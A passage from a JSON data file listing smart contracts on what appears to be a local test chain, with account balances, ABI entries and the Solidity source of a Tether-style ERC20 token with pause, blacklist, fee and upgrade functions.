transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0xA94B7f0465E98609391C623d0560C5720a3f2D33",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0xA94B7f0465E98609391C623d0560C5720a3f2D33": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99731430000000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x6eD79Aa1c71FD7BdBC515EfdA3Bd4e26394435cC",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": 